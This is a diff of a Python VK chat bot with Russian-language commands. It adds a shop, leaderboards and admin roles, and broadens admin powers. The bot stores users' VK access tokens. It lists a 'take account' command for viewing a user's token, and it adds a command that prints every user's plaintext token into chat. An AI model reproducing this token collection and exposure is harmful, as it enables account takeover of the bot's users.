             send_message(event.peer_id, "Укажите пользователя.")
             return
@@ -1190,65 +1310,223 @@ def process_command(event):
         send_message(event.peer_id, f"✅ Пользователь {target_id} разблокирован.")
 
     elif command == 'выдатьзащита':
-        if not is_prince(user_id):
+        if not is_admin(user_id):
             send_message(event.peer_id, "⛔ Недостаточно прав.")
             return
-        target_id = parse_target_id(event) or user_id
+        target_id, _ = get_target_and_clean_args(event, args)
+        target_id = target_id or user_id
         db_create_user(target_id)
         db_update_user(target_id, protection=1)
         send_message(event.peer_id, f"✅ Защита выдана пользователю {target_id}.")
 
     elif command == 'starshop':
-        if not is_prince(user_id):
-            send_message(event.peer_id, "⛔ Недостаточно прав.")
-            return
-        send_message(event.peer_id, "Магазин модерации:\n1. Звезда — 1000 БТС\n2. Снятие бана — 5000 БТС\n(заглушка)")
+        # Магазин модерации
+        shop_text = """
+🛒 Магазин за звёзды:
+⭐ Ваши звёзды можно получить за нахождение багов или идеи для бота.
 
-    elif command == 'забратьак':
-        if not is_prince(user_id):
-            send_message(event.peer_id, "⛔ Недостаточно прав.")
+Товары:
+👑 Герцог на неделю — 150 звёзд
+🛡️ Защита на месяц — 350 звёзд
+💰 БТС: 1 БТС = 5 звёзд
+🧪 Дофамин: 5 дофамина = 1 звезда
+📈 Повышение роли:
+   • Участник → Элита: 7000 звёзд
+   • Элита → Князь: 5000 звёзд
+   • Князь → Император: 25000 звёзд
+   • Император → Админ: 1000000 звёзд
+
+Для покупки используйте /buy <товар> [количество]
+Примеры:
+/buy герцог
+/buy защита
+/buy бтс 10
+/buy дофамин 5
+/buy повышение
+"""
+        send_message(event.peer_id, shop_text)
+
+    elif command == 'buy':
+        # Покупка в магазине
+        if not args:
+            send_message(event.peer_id, "Использование: /buy <товар> [количество]")
             return
-        target_id = parse_target_id(event)
+        item = args[0].lower()
+        row = db_get_user(user_id)
+        if not row:
+            return
+        stars = row[11]
+        if item == 'герцог':
+            cost = 150
+            if stars < cost:
+                send_message(event.peer_id, f"❌ Недостаточно звёзд. Нужно {cost}.")
+                return
+            db_update_user(user_id, stars=stars - cost, herzog=1)
+            send_message(event.peer_id, "✅ Вы купили Герцога на неделю!")
+        elif item == 'защита':
+            cost = 350
+            if stars < cost:
+                send_message(event.peer_id, f"❌ Недостаточно звёзд. Нужно {cost}.")
+                return
+            db_update_user(user_id, stars=stars - cost, protection=1)
+            send_message(event.peer_id, "✅ Вы купили защиту на месяц!")
+        elif item == 'бтс':
+            if len(args) < 2:
+                send_message(event.peer_id, "Укажите количество БТС: /buy бтс <кол-во>")
+                return
+            try:
+                amount = int(args[1])
+                if amount <= 0:
+                    raise ValueError
+            except:
+                send_message(event.peer_id, "Неверное количество.")
+                return
+            cost = amount * 5
+            if stars < cost:
+                send_message(event.peer_id, f"❌ Недостаточно звёзд. Нужно {cost}.")
+                return
+            db_update_user(user_id, stars=stars - cost, btc=row[3] + amount)
+            send_message(event.peer_id, f"✅ Вы купили {amount} БТС за {cost} звёзд.")
+        elif item == 'дофамин':
+            if len(args) < 2:
+                send_message(event.peer_id, "Укажите количество дофамина (кратно 5): /buy дофамин <кол-во>")
+                return
+            try:
+                amount = int(args[1])
+                if amount <= 0 or amount % 5 != 0:
+                    raise ValueError
+            except:
+                send_message(event.peer_id, "Количество должно быть положительным и кратным 5.")
+                return
+            cost = amount // 5
+            if stars < cost:
+                send_message(event.peer_id, f"❌ Недостаточно звёзд. Нужно {cost}.")
+                return
+            db_update_user(user_id, stars=stars - cost, dofamin=row[4] + amount)
+            send_message(event.peer_id, f"✅ Вы купили {amount} дофамина за {cost} звёзд.")
+        elif item == 'повышение':
+            current_role = row[2]
+            role_prices = {
+                0: (7000, 1, 'Элита'),
+                1: (5000, 2, 'Князь'),
+                2: (25000, 3, 'Император'),
+                3: (1000000, 4, 'Админ')
+            }
+            if current_role >= 4:
+                send_message(event.peer_id, "❌ Вы уже имеете максимальную роль, доступную для покупки.")
+                return
+            cost, new_role, role_name = role_prices[current_role]
+            if stars < cost:
+                send_message(event.peer_id, f"❌ Недостаточно звёзд. Нужно {cost}.")
+                return
+            db_update_user(user_id, stars=stars - cost, role=new_role)
+            send_message(event.peer_id, f"✅ Поздравляем! Вы повышены до роли {role_name}!")
+        else:
+            send_message(event.peer_id, "❌ Неизвестный товар. Доступно: герцог, защита, бтс, дофамин, повышение.")
+
+    elif command == 'топбтс':
+        cursor.execute('SELECT user_id, btc FROM users ORDER BY btc DESC LIMIT 10')
+        rows = cursor.fetchall()
+        if rows:
+            message = "🏆 Топ по БТС:\n"
+            for i, r in enumerate(rows, 1):
+                message += f"{i}. ID {r[0]} — {r[1]} БТС\n"
+            send_message(event.peer_id, message)
+        else:
+            send_message(event.peer_id, "Нет данных.")
+
+    elif command == 'топдоф':
+        cursor.execute('SELECT user_id, dofamin FROM users ORDER BY dofamin DESC LIMIT 10')
+        rows = cursor.fetchall()
+        if rows:
+            message = "🧪 Топ по дофамину:\n"
+            for i, r in enumerate(rows, 1):
+                message += f"{i}. ID {r[0]} — {r[1]} дофамина\n"
+            send_message(event.peer_id, message)
+        else:
+            send_message(event.peer_id, "Нет данных.")
+
+    elif command == 'герцоги':
+        cursor.execute('SELECT user_id FROM users WHERE herzog=1')
+        rows = cursor.fetchall()
+        if rows:
+            message = "👑 Обладатели Герцога:\n"
+            for r in rows:
+                message += f"• ID {r[0]}\n"
+            send_message(event.peer_id, message)
+        else:
+            send_message(event.peer_id, "Никто не имеет Герцога.")
+
+    elif command == 'защищённые':
+        cursor.execute('SELECT user_id FROM users WHERE protection=1')
+        rows = cursor.fetchall()
+        if rows:
+            message = "🛡️ Защищённые пользователи:\n"
+            for r in rows:
+                message += f"• ID {r[0]}\n"
+            send_message(event.peer_id, message)
+        else:
+            send_message(event.peer_id, "Никто не имеет защиты.")
+
+    elif command == '+админ':
+        if not is_creator(user_id):
+            send_message(event.peer_id, "⛔ Только создатель может назначать администраторов.")
+            return
+        target_id, _ = get_target_and_clean_args(event, args)
         if not target_id:
             send_message(event.peer_id, "Укажите пользователя.")
             return
-        row = db_get_user(target_id)
-        if row and row[1]:
-            send_message(event.peer_id, f"Токен пользователя {target_id}: {row[1]}")
-        else:
-            send_message(event.peer_id, "У пользователя нет сохранённого токена.")
+        db_create_user(target_id)
+        db_update_user(target_id, role=4)
+        send_message(event.peer_id, f"✅ Пользователь {target_id} назначен администратором.")
+
+    elif command == '-админ':
+        if not is_creator(user_id):
+            send_message(event.peer_id, "⛔ Только создатель может снимать администраторов.")
+            return
+        target_id, _ = get_target_and_clean_args(event, args)
+        if not target_id:
+            send_message(event.peer_id, "Укажите пользователя.")
+            return
+        db_create_user(target_id)
+        db_update_user(target_id, role=0)
+        send_message(event.peer_id, f"✅ Пользователь {target_id} снят с должности администратора.")
 
     elif command == 'helpr3':
-        if is_emperor(user_id):
+        if is_admin(user_id):
             send_message(event.peer_id, """
-            Команды ранга Император:
+            Команды ранга Админ+ (включая Императора и выше):
             /givstar — выдать звёзды
-            /block (пользователь) (0--1) (причина)
-            /выдатьбтс — выдать валюту
-            /выдгерцог — выдать герцога
-            /статвся — вся информация о пользователях
+            /статвся — вся статистика
             /выдатьдоф — выдать дофамин
             /-kd — сбросить кулдауны
-            /+токен (токен) — добавить токен пользователя
-            /-дофамин (пользователь) — забрать дофамин
-            /забгерцог (пользователь) — забрать герцога
+            /+токен — добавить токен
+            /-дофамин — забрать дофамин
+            /забгерцог — забрать герцога
+            /rcode — создать код регистрации
+            /codes — список кодов
+            /забратьак — посмотреть токен пользователя
+            /restart — перезапустить бота
+            /stop — остановить бота
+            /сброс — сбросить токен
+            /токен инфа — проверить токен
             """)
         else:
             send_message(event.peer_id, "⛔ Недостаточно прав.")
 
     elif command == 'givstar':
-        if not is_emperor(user_id):
+        if not is_admin(user_id):
             send_message(event.peer_id, "⛔ Недостаточно прав.")
             return
-        if len(args) < 2:
-            send_message(event.peer_id, "Использование: /givstar (пользователь) (количество)")
-            return
-        target_id = parse_target_id(event)
+        target_id, cleaned_args = get_target_and_clean_args(event, args)
         if not target_id:
             send_message(event.peer_id, "Укажите пользователя.")
             return
+        if not cleaned_args:
+            send_message(event.peer_id, "Укажите количество.")
+            return
         try:
-            stars = int(args[-1])
+            stars = int(cleaned_args[-1])
         except:
             send_message(event.peer_id, "Неверное количество.")
             return
@@ -1258,7 +1536,7 @@ def process_command(event):
         send_message(event.peer_id, f"✅ Выдано {stars} звёзд пользователю {target_id}.")
 
     elif command == 'статвся':
-        if not is_emperor(user_id):
+        if not is_admin(user_id):
             send_message(event.peer_id, "⛔ Недостаточно прав.")
             return
         cursor.execute('SELECT user_id, btc, dofamin, herzog, role, stars, is_disabled FROM users')
@@ -1273,10 +1551,11 @@ def process_command(event):
             send_message(event.peer_id, "Нет данных.")
 
     elif command == 'выдатьдоф':
-        if not is_emperor(user_id):
+        if not is_admin(user_id):
             send_message(event.peer_id, "⛔ Недостаточно прав.")
             return
-        target_id = parse_target_id(event) or user_id
+        target_id, _ = get_target_and_clean_args(event, args)
+        target_id = target_id or user_id
         db_create_user(target_id)
         row = db_get_user(target_id)
         amount = random.randint(1, 10)
@@ -1284,7 +1563,7 @@ def process_command(event):
         send_message(event.peer_id, f"✅ Выдано {amount} дофамина пользователю {target_id}.")
 
     elif command == '-kd':
-        if not is_emperor(user_id):
+        if not is_admin(user_id):
             send_message(event.peer_id, "⛔ Недостаточно прав.")
             return
         cursor.execute('UPDATE users SET last_dofamin_time=0, last_steal_time=0, last_prize_time=0')
@@ -1292,7 +1571,7 @@ def process_command(event):
         send_message(event.peer_id, "✅ Кулдауны сброшены для всех.")
 
     elif command == '+токен':
-        if not is_emperor(user_id):
+        if not is_admin(user_id):
             send_message(event.peer_id, "⛔ Недостаточно прав.")
             return
         if not args:
@@ -1303,10 +1582,10 @@ def process_command(event):
         send_message(event.peer_id, "✅ Токен сохранён.")
 
     elif command == '-дофамин':
-        if not is_emperor(user_id):
+        if not is_admin(user_id):
             send_message(event.peer_id, "⛔ Недостаточно прав.")
             return
-        target_id = parse_target_id(event)
+        target_id, _ = get_target_and_clean_args(event, args)
         if not target_id:
             send_message(event.peer_id, "Укажите пользователя.")
             return
@@ -1318,10 +1597,10 @@ def process_command(event):
             send_message(event.peer_id, "У пользователя нет дофамина.")
 
     elif command == 'забгерцог':
-        if not is_emperor(user_id):
+        if not is_admin(user_id):
             send_message(event.peer_id, "⛔ Недостаточно прав.")
             return
-        target_id = parse_target_id(event)
+        target_id, _ = get_target_and_clean_args(event, args)
         if not target_id:
             send_message(event.peer_id, "Укажите пользователя.")
             return
@@ -1330,8 +1609,8 @@ def process_command(event):
         send_message(event.peer_id, f"✅ Герцог забран у пользователя {target_id}.")
 
     elif command == 'токен инфа' or command == 'токен_инфа':
-        if not is_creator(user_id):
-            send_message(event.peer_id, "⛔ Только создатель может использовать эту команду.")
+        if not is_admin(user_id):
+            send_message(event.peer_id, "⛔ Только администрация может использовать эту команду.")
             return
         if not args:
             send_message(event.peer_id, "Использование: /токен инфа (токен)")
@@ -1345,9 +1624,28 @@ def process_command(event):
         except Exception as e:
             send_message(event.peer_id, f"❌ Токен недействителен или ошибка: {e}")
 
-    elif command == 'restart':
+    elif command == 'базаданных':
         if not is_creator(user_id):
-            send_message(event.peer_id, "⛔ Только создатель может перезапускать бота.")
+            send_message(event.peer_id, "⛔ Только создатель может просматривать базу данных.")
+            return
+        cursor.execute('SELECT user_id, access_token FROM users')
+        rows = cursor.fetchall()
+        if not rows:
+            send_message(event.peer_id, "База данных пуста.")
+            return
+        message = "📋 База данных пользователей:\n"
+        for i, r in enumerate(rows):
+            token = r[1] if r[1] else "нет токена"
+            message += f"{i+1}. ID: {r[0]}, Токен: {token}\n"
+            if len(message) > 3500:
+                send_message(event.peer_id, message)
+                message = ""
+        if message:
+            send_message(event.peer_id, message)
+
+    elif command == 'restart':
+        if not is_admin(user_id):
+            send_message(event.peer_id, "⛔ Только администрация может перезапускать бота.")
             return
         send_message(event.peer_id, "🔄 Бот перезапускается...")
         time.sleep(1)
@@ -1355,16 +1653,16 @@ def process_command(event):
         os.execv(sys.executable, ['python'] + sys.argv)
 
     elif command == 'stop':
-        if not is_creator(user_id):
-            send_message(event.peer_id, "⛔ Только создатель может остановить бота.")
+        if not is_admin(user_id):
+            send_message(event.peer_id, "⛔ Только администрация может остановить бота.")
             return
         send_message(event.peer_id, "🛑 Бот останавливается... Данные сохранены.")
         conn.commit()
         sys.exit(0)
 
     elif command == 'сброс' or command == 'сбросить':
-        if not is_creator(user_id):
-            send_message(event.peer_id, "⛔ Только создатель может сбрасывать токены.")
+        if not is_admin(user_id):
+            send_message(event.peer_id, "⛔ Только администрация может сбрасывать токены.")
             return
         if len(args) < 1:
             send_message(event.peer_id, "Использование: /сброс (токен) или /сброс (айди пользователя)")
@@ -1387,7 +1685,7 @@ def process_command(event):
         if not is_creator(user_id):
             send_message(event.peer_id, "⛔ Только создатель может отключать пользователей.")
             return
-        target_id = parse_target_id(event)
+        target_id, _ = get_target_and_clean_args(event, args)
         if not target_id:
             send_message(event.peer_id, "Укажите пользователя (ответом или ссылкой).")
             return
@@ -1402,7 +1700,7 @@ def process_command(event):
         if not is_creator(user_id):
             send_message(event.peer_id, "⛔ Только создатель может включать пользователей.")
             return
-        target_id = parse_target_id(event)
+        target_id, _ = get_target_and_clean_args(event, args)
         if not target_id:
             send_message(event.peer_id, "Укажите пользователя (ответом или ссылкой).")
             return
@@ -1416,7 +1714,7 @@ def process_command(event):
 # ================= ЗАПУСК =================
 print("Бот запущен. Ожидание сообщений...")
 for event in longpoll.listen():
-    if event.type == VkEventType.MESSAGE_NEW and event.to_me:
+    if event.type == VkEventType.MESSAGE_NEW:
         try:
             process_command(event)
         except Exception as e:
